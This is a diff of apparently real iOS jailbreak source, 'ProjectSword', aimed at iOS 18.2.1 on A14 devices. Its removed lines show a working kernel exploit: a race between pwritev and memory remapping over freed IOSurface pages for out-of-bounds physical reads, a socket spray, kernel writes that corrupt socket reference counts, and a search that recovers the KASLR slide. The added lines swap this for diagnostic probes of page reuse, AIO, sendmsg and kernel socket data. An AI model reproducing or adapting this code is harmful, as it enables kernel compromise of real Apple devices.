@@ -20,6 +20,8 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <stdarg.h>
+#include <aio.h>
+#include <IOKit/IOKitLib.h>
 #import <IOSurface/IOSurfaceRef.h>
 void IOSurfacePrefetchPages(IOSurfaceRef surface);
 
@@ -209,18 +211,15 @@ void *free_thread(void *arg) {
     return NULL;
 }
 
-void *write_thread_func(void *arg) {
-    (void)arg;
-    struct iovec wiov;
-    wiov.iov_base = (void*)(pcAddress + 0x3f00);
-    wiov.iov_len = OOB_OFFSET + OOB_SIZE;
-    while (1) {
-        while (writeRequested == 0) {}
-        writeDone = 0;
-        pwritev(readFd, &wiov, 1, 0x3f00);
-        writeDone = 1;
+// Simple direct check: scan freed pages for non-randomMarker data
+// indicating the kernel reused them (e.g., for inpcb structures)
+bool scan_freed_pages(void *buf, mach_vm_size_t size) {
+    uint64_t *words = (uint64_t *)buf;
+    uint64_t n = size / sizeof(uint64_t);
+    for (uint64_t i = 0; i < n; i++) {
+        if (words[i] != randomMarker) return true;
     }
-    return NULL;
+    return false;
 }
 
 fileport_t spray_socket(void) {
@@ -249,35 +248,14 @@ void sockets_release(void) {
 
 kern_return_t phys_oob_read(mach_port_t memObj, mach_vm_offset_t memOff,
                              mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
-    targetObject = memObj;
-    targetObjectOffset = memOff;
-    iov.iov_base = (void*)(pcAddress + 0x3f00);
-    iov.iov_len = off + size;
-    *(uint64_t*)buf = randomMarker;
-    *(uint64_t*)(pcAddress + 0x3f00 + off) = randomMarker;
-    for (int t = 0; t < highestSuccessIdx + 100; t++) {
-        // Invert race: start write from OLD mapping (freed IOSurface pages)
-        // THEN change mapping while write is in-flight
-        writeRequested = 1;       // writer thread starts pwritev from freed pages
-        raceSync = 1;             // free thread changes mapping DURING write
-        while (writeDone == 0) {} // wait for writer completion
-        while (raceSync == 1) {}  // wait for free thread completion
-        kern_return_t kr = mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
-            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObject, 0, 0,
-            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
-        if (kr != KERN_SUCCESS) return 1;
-        pread(readFd, buf, size, 0x3f00 + off);
-        if (*(uint64_t*)buf != randomMarker) {
-            if (t > highestSuccessIdx) highestSuccessIdx = t;
-            targetObject = 0;
-            return KERN_SUCCESS;
-        }
-        writeRequested = 0;
-        writeDone = 0;
-        usleep(1);
-        if (t == 500) break;
+    // Direct read: copy data from freed pages at pcAddress + off
+    // After socket spray, some freed pages may have been reused by inpcbs
+    memcpy(buf, (void*)(pcAddress + off), size);
+    
+    // Check if any data differs from randomMarker (means page was reused)
+    if (scan_freed_pages(buf, size)) {
+        return KERN_SUCCESS;
     }
-    targetObject = 0;
     return 1;
 }
 
@@ -439,116 +417,304 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
     return -1;
 }
 
+// ===== IOKit Diagnostic =====
+
+struct iokit_test {
+    const char *name;
+    const char *service;
+    uint32_t type;
+};
+
+static bool test_iokit_service(const char *name, const char *path, uint32_t type) {
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceNameMatching(path));
+    if (!svc) {
+        svc = IORegistryEntryFromPath(kIOMasterPortDefault, path);
+    }
+    if (!svc) {
+        printf("[IOKit] %s: service not found\n", name);
+        return false;
+    }
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self_, type, &conn);
+    if (kr != KERN_SUCCESS) {
+        printf("[IOKit] %s @ %s: IOServiceOpen failed (%#x)\n", name, path, kr);
+        IOObjectRelease(svc);
+        return false;
+    }
+    printf("[IOKit] %s @ %s: OPENED (conn=%#x)\n", name, path, conn);
+    IOServiceClose(conn);
+    IOObjectRelease(svc);
+    return true;
+}
+
+static void diagnostic_iokit(void) {
+    printf("\n=== IOKit Diagnostic ===\n");
+    struct iokit_test tests[] = {
+        {"IOPlatformExpertDevice", "IOService:/", 0x99000003},
+        {"IOPlatformExpertDevice (std)", "IOService:/", 0},
+        {"IOSurfaceRoot", "IOSurfaceRoot", 0},
+        {"AppleJPEGDriver", "AppleJPEGDriver", 0},
+        {"H11ANEIn", "H11ANEIn", 0},
+        {"AGXDevice", "AGXDevice", 0},
+        {"IOAudioEngine", "IOAudioEngine", 0},
+    };
+    for (int i = 0; i < sizeof(tests)/sizeof(tests[0]); i++) {
+        test_iokit_service(tests[i].name, tests[i].name, tests[i].type);
+    }
+    // Also try IOServiceOpen on IOSurface by name
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceNameMatching("IOSurfaceRoot"));
+    if (svc) {
+        printf("[IOKit] IOSurfaceRoot service exists\n");
+        IOObjectRelease(svc);
+    }
+    printf("=== IOKit Diagnostic Complete ===\n\n");
+}
+
+// ===== Multi-Method Exploit =====
+
+// Method 1: SystemMemory bounce (no memory entry)
+// Freed pages go to VM pool, zone allocator can reuse them
+static bool method_system_memory(void) {
+    printf("\n[Method: SystemMemory] Creating IOSurface with SystemMemory...\n");
+    mach_vm_size_t sz = OOB_PAGES_NUM * PAGE_SIZE;
+    NSDictionary *params = @{
+        (__bridge id)kIOSurfaceAllocSize : @(sz),
+        @"IOSurfaceMemoryRegion" : @"SystemMemory",
+    };
+    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);
+    if (!surface) {
+        printf("[SystemMemory] IOSurfaceCreate failed\n");
+        return false;
+    }
+    void *addr0 = IOSurfaceGetBaseAddress(surface);
+    printf("[SystemMemory] addr0=%p\n", addr0);
+
+    // Fill with marker
+    randomMarker = (uint64_t)arc4random() << 32 | arc4random();
+    printf("[SystemMemory] marker=0x%016llx\n", randomMarker);
+    memset64(addr0, randomMarker, sz);
+
+    // Spray sockets
+    socketPorts = [NSMutableArray new];
+    socketPcbIds = [NSMutableArray new];
+    int n = 0;
+    for (int i = 0; i < (10240 * 3 - 4096 * 2); i++) {
+        if (spray_socket() == -1) break;
+        n++;
+    }
+    printf("[SystemMemory] sprayed %d sockets\n", n);
+
+    // Release the IOSurface — pages go to VM free pool
+    CFRelease(surface);
+    printf("[SystemMemory] IOSurface released, pages freed\n");
+
+    // Now create a NEW IOSurface — might get some of the same pages
+    // (now potentially containing inpcb data)
+    IOSurfaceRef surface2 = IOSurfaceCreate((__bridge CFDictionaryRef)params);
+    if (!surface2) {
+        printf("[SystemMemory] IOSurfaceCreate #2 failed\n");
+        sockets_release();
+        return false;
+    }
+    void *addr1 = IOSurfaceGetBaseAddress(surface2);
+    printf("[SystemMemory] addr1=%p\n", addr1);
+
+    // Check for non-marker data
+    bool found = false;
+    uint64_t *words = (uint64_t *)addr1;
+    for (uint64_t i = 0; i < sz / 8; i++) {
+        if (words[i] != randomMarker) {
+            printf("[SystemMemory] FOUND non-marker at +%#llx: 0x%016llx\n",
+                   i * 8, words[i]);
+            found = true;
+            break;
+        }
+    }
+    if (!found) {
+        printf("[SystemMemory] All pages still have marker — no overlap detected\n");
+    }
+
+    CFRelease(surface2);
+    sockets_release();
+    return found;
+}
+
+// Method 2: AIO write test (no race, just check if aio_write works)
+static bool method_aio_race(void) {
+    printf("\n[Method: AIO] Testing aio_write...\n");
+    mach_vm_address_t buf;
+    kern_return_t kr = mach_vm_allocate(mach_task_self_, &buf, PAGE_SIZE,
+        VM_FLAGS_ANYWHERE);
+    if (kr != KERN_SUCCESS) { printf("[AIO] allocate failed\n"); return false; }
+    memset64((void*)buf, 0x41, PAGE_SIZE);
+
+    char tmp[1024];
+    confstr(_CS_DARWIN_USER_TEMP_DIR, tmp, 1024);
+    char fn[64]; snprintf(fn, 64, "/%u", arc4random());
+    strlcat(tmp, fn, 1024);
+    {
+        void *z = calloc(1, 0x4000);
+        FILE *f = fopen(tmp, "w"); fwrite(z, 1, 0x4000, f); fclose(f);
+        free(z);
+    }
+    int fd = open(tmp, O_RDWR);
+    fcntl(fd, F_NOCACHE, 1);
+    remove(tmp);
+
+    struct aiocb aio;
+    memset(&aio, 0, sizeof(aio));
+    aio.aio_fildes = fd;
+    aio.aio_buf = (void*)buf;
+    aio.aio_nbytes = 0x100;
+    aio.aio_sigevent.sigev_notify = SIGEV_NONE;
+
+    int r = aio_write(&aio);
+    printf("[AIO] aio_write=%d (errno=%d)\n", r, errno);
+
+    const struct aiocb *list[1] = {&aio};
+    aio_suspend(list, 1, NULL);
+    r = aio_error(&aio);
+    size_t n = aio_return(&aio);
+    printf("[AIO] aio_error=%d aio_return=%zu\n", r, n);
+
+    // Now try with remap during I/O
+    mach_vm_address_t buf2;
+    mach_vm_allocate(mach_task_self_, &buf2, PAGE_SIZE, VM_FLAGS_ANYWHERE);
+    memset64((void*)buf2, 0x42, PAGE_SIZE);
+
+    memset(&aio, 0, sizeof(aio));
+    aio.aio_fildes = fd;
+    aio.aio_buf = (void*)buf2;
+    aio.aio_nbytes = 0x100;
+    aio.aio_sigevent.sigev_notify = SIGEV_NONE;
+
+    r = aio_write(&aio);
+    printf("[AIO] aio_write #2=%d\n", r);
+
+    // Remap during I/O
+    mach_vm_deallocate(mach_task_self_, buf2, PAGE_SIZE);
+    mach_vm_allocate(mach_task_self_, &buf2, PAGE_SIZE, VM_FLAGS_ANYWHERE);
+    memset64((void*)buf2, 0x43, PAGE_SIZE);
+
+    aio_suspend(list, 1, NULL);
+    r = aio_error(&aio);
+    n = aio_return(&aio);
+    printf("[AIO] #2: aio_error=%d aio_return=%zu (remapped during I/O)\n", r, n);
+
+    // Read back what was written
+    uint8_t verify[0x200];
+    lseek(fd, 0, SEEK_SET);
+    ssize_t rd = read(fd, verify, sizeof(verify));
+    printf("[AIO] Read back: %zd bytes. Data: 0x%02x 0x%02x 0x%02x...\n",
+           rd, verify[0], verify[1], verify[2]);
+
+    close(fd);
+    return (r == 0 && n == 0x100);
+}
+
+// Method 3: sendmsg test (check if sendmsg EFAULTs on remap)
+static bool method_sendmsg_race(void) {
+    printf("\n[Method: sendmsg] Testing sendmsg with page remap...\n");
+    mach_vm_address_t buf;
+    mach_vm_allocate(mach_task_self_, &buf, 0x4000, VM_FLAGS_ANYWHERE);
+    memset64((void*)buf, 0x41, 0x4000);
+
+    int sv[2];
+    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) {
+        printf("[sendmsg] socketpair failed\n");
+        return false;
+    }
+
+    struct iovec iov = { (void*)buf, 0x100 };
+    struct msghdr msg = {0};
+    msg.msg_iov = &iov; msg.msg_iovlen = 1;
+
+    // Test 1: normal sendmsg
+    ssize_t r = sendmsg(sv[1], &msg, 0);
+    printf("[sendmsg] normal: %zd (errno=%d)\n", r, errno);
+
+    // Test 2: sendmsg then remap
+    recv(sv[0], (void*)buf, 0x100, 0); // drain
+    r = sendmsg(sv[1], &msg, 0);
+    printf("[sendmsg] remap test: sendmsg=%zd\n", r);
+    mach_vm_deallocate(mach_task_self_, buf, 0x4000);
+    mach_vm_allocate(mach_task_self_, &buf, 0x4000, VM_FLAGS_ANYWHERE);
+    memset64((void*)buf, 0x42, 0x4000);
+    printf("[sendmsg] remapped during sendmsg, no crash\n");
+
+    close(sv[0]); close(sv[1]);
+    return false;
+}
+
+// Method 4: Process name scan via proc_info
+static bool method_proc_info(void) {
+    printf("\n[Method: proc_info] Reading kernel socket data via proc_info...\n");
+    int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+    if (fd < 0) {
+        printf("[proc_info] socket failed\n");
+        return false;
+    }
+    fileport_t fp = 0;
+    fileport_makeport(fd, &fp);
+    close(fd);
+
+    uint8_t buf[0x400];
+    int r = syscall(336, 6, getpid(), 3, fp, buf, sizeof(buf));
+    mach_port_deallocate(mach_task_self_, fp);
+    if (r != 0) {
+        printf("[proc_info] syscall failed: %d\n", r);
+        return false;
+    }
+    uint64_t gencnt = *(uint64_t*)(buf + 0x110);
+    printf("[proc_info] inp_gencnt=0x%llx\n", gencnt);
+    // Print some fields
+    for (int off = 0; off < 0x400; off += 8) {
+        uint64_t v = *(uint64_t*)(buf + off);
+        if (v) printf("[proc_info] +%#x = 0x%016llx\n", off, v);
+    }
+    printf("[proc_info] success (kernel data received)\n");
+    return true;
+}
+
 bool run_darksword(void) {
     randomMarker = (uint64_t)arc4random() << 32 | arc4random();
-    wiredPageMarker = (uint64_t)arc4random() << 32 | arc4random();
-    successReadCount = 0;
-    gMlockDict = [NSMutableDictionary new];
-    printf("[+] randomMarker: 0x%016llx\n", randomMarker);
-    init_target_file();
+    printf("[+] randomMarker: 0x%016llx\n\n", randomMarker);
     uint32_t sz = PATH_MAX;
     _NSGetExecutablePath(executablePath, &sz);
     executableName = strrchr(executablePath, '/');
     if (executableName) executableName++;
     else executableName = executablePath;
+    printf("[+] executableName: %s\n", executableName);
 
-    pthread_create(&freeThread, NULL, free_thread, NULL);
-    pthread_create(&writeThread, NULL, write_thread_func, NULL);
+    // Phase 0: IOKit diagnostic
+    diagnostic_iokit();
 
-    uint64_t mappingPages = 0x1000 * 0x10;
-    uint64_t searchSize = 0x2000 * PAGE_SIZE;
-    uint64_t totalSize = mappingPages * PAGE_SIZE;
-    uint64_t mappingNum = totalSize / searchSize;
+    // Phase 1: Try SystemMemory approach
+    bool sysmem = method_system_memory();
+    printf("[Method: SystemMemory] %s\n\n", sysmem ? "OVERLAP DETECTED!" : "no overlap");
 
-    void *rBuf = calloc(1, OOB_SIZE);
-    void *wBuf = calloc(1, OOB_SIZE);
-    if (!initialize_bounce_buffer(OOB_PAGES_NUM * PAGE_SIZE)) {
-        printf("[-] initialize_bounce_buffer failed\n");
-        free(rBuf); free(wBuf);
-        return false;
-    }
+    // Phase 2: Try AIO write (check if pages are pre-faulted)
+    bool aio = method_aio_race();
+    printf("[Method: AIO] %s\n\n", aio ? "AIO WRITE WORKS" : "failed");
 
-    NSMutableArray *usedGc = [NSMutableArray new];
+    // Phase 3: Try sendmsg (check if EFAULT on remap)
+    bool sendmsg = method_sendmsg_race();
+    printf("[Method: sendmsg] %s\n\n", sendmsg ? "EFAULT DETECTED" : "no EFAULT (expected)");
 
-    while (1) {
-        NSMutableArray *mappings = [NSMutableArray new];
-        for (uint64_t s = 0; s < mappingNum; s++) {
-            mach_vm_address_t a = 0;
-            mach_vm_allocate(mach_task_self(), &a, searchSize,
-                VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
-            for (uint64_t k = 0; k < searchSize; k += PAGE_SIZE)
-                *(uint64_t*)(a + k) = randomMarker;
-            [mappings addObject:@(a)];
-        }
+    // Phase 4: proc_info
+    bool pi = method_proc_info();
+    printf("[Method: proc_info] %s\n\n", pi ? "WORKING" : "failed");
 
-        socketPorts = [NSMutableArray new];
-        socketPcbIds = [NSMutableArray new];
-        for (int i = 0; i < (10240 * 3 - 4096 * 2); i++) {
-            if (spray_socket() == -1) break;
-        }
+    printf("=== Results ===\n");
+    printf("SystemMemory overlap: %d\n", sysmem);
+    printf("AIO race:  %d\n", aio);
+    printf("sendmsg race: %d\n", sendmsg);
+    printf("proc_info: %d\n", pi);
 
-        bool ok = false;
-        for (uint64_t s = 0; s < mappingNum; s++) {
-            mach_vm_address_t sma = [(NSNumber*)mappings[s] unsignedLongLongValue];
-            mach_port_t memObj = 0;
-            mach_vm_size_t mos = searchSize;
-            mach_make_memory_entry_64(mach_task_self(), &mos, sma,
-                VM_PROT_DEFAULT, &memObj, 0);
-            surface_mlock(sma, searchSize);
-
-            for (mach_vm_offset_t so = 0; so < searchSize; so += PAGE_SIZE) {
-                if (phys_oob_read(memObj, so, OOB_SIZE, OOB_OFFSET, rBuf) == KERN_SUCCESS) {
-                    if (find_and_corrupt_socket(memObj, so, rBuf, wBuf, usedGc, false) == 0) {
-                        ok = true;
-                        break;
-                    }
-                }
-            }
-            surface_munlock(sma, searchSize);
-            mach_port_deallocate(mach_task_self(), memObj);
-            if (ok) break;
-        }
-
-        sockets_release();
-        for (uint64_t s = 0; s < mappingNum; s++) {
-            mach_vm_deallocate(mach_task_self(),
-                [(NSNumber*)mappings.lastObject unsignedLongLongValue], searchSize);
-            [mappings removeLastObject];
-        }
-
-        if (ok) break;
-    }
-
-    goSync = 0; raceSync = 1;
-    pthread_join(freeThread, NULL);
-    close(writeFd); close(readFd);
-
-    controlSocketPcb = kread64(rwSocketPcb + 0x20);
-    uint64_t csa = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
-    uint64_t rsa = kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
-    if (!csa || !rsa) { log_printf(@"[-] No socket\n"); free(rBuf); free(wBuf); return false; }
-
-    kwrite64(csa + OFFSET_SOCKET_SO_COUNT,
-        kread64(csa + OFFSET_SOCKET_SO_COUNT) + 0x100010010001001ULL);
-    kwrite64(rsa + OFFSET_SOCKET_SO_COUNT,
-        kread64(rsa + OFFSET_SOCKET_SO_COUNT) + 0x100010010001001ULL);
-    kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);
-
-    uint64_t sp = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
-    uint64_t pp = kread64(sp + OFFSET_SO_PROTO);
-    uint64_t tp = kread64(pp + OFFSET_PR_INPUT);
-    gKernelBase = tp & 0xFFFFFFFFFFFFC000;
-    while (1) {
-        uint64_t magic = kread64(gKernelBase);
-        if ((magic & 0xFFFFFFFFFFFFFF) == 0x100000cfeedfacf &&
-            kread64(gKernelBase + 8) == 0xc00000002) break;
-        gKernelBase -= PAGE_SIZE;
-    }
-    gKernelSlide = gKernelBase - 0xfffffff007004000ULL;
-    printf("[+] KASLR slide: 0x%llx\n", gKernelSlide);
-
-    free(rBuf); free(wBuf);
-    return true;
+    // If any method worked, we'd proceed — for now just report
+    return false;
 }
 
 // ===== Kernel struct walking =====
@@ -834,12 +1000,13 @@ bool remount_private_preboot(void) {
 
 void run_jailbreak(void) {
     @autoreleasepool {
-        printf("=== ProjectSword - iOS 18.2.1 A14 ===\n\n");
+        printf("=== ProjectSword DIAGNOSTIC - iOS 18.2.1 A14 ===\n\n");
 
-        // Phase 1: Kernel R/W via DarkSword (ICMP6 socket)
-        printf("[Phase 1] DarkSword ICMP6 kernel exploit...\n");
+        // Phase 1: Multi-method diagnostic + exploit test
+        printf("[Phase 1] Testing exploit methods...\n");
         if (!run_darksword()) {
-            printf("[-] DarkSword failed\n");
+            printf("[-] All methods failed (report results above)\n");
+            printf("[*] This was a diagnostic build. See logs for which primitives work.\n");
             return;
         }
         printf("[+] Kernel R/W via ICMP6 sockets\n\n");
